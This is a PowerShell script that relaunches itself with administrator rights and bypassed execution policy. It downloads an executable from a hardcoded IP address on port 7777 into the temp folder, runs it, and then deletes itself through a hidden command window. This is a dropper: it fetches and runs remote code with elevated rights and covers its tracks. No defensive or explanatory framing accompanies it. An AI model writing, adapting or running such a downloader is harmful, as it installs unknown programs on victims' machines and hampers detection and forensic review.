# Requires Admin Privileges
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
    [Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Set variables
$downloadUrl = "http://94.108.5.83:7777"  # Replace with actual URL
$exePath = "$env:TEMP\downloaded.exe"

# Download file
Invoke-WebRequest -Uri $downloadUrl -OutFile $exePath

# Execute downloaded file
Start-Process -FilePath $exePath

# Self-delete logic
$cmd = "cmd /c ping http://94.108.5.83:7777 -n 3 > nul & del `"$($MyInvocation.MyCommand.Path)`""
Start-Process -FilePath "cmd.exe" -ArgumentList "/c", $cmd -WindowStyle Hidden
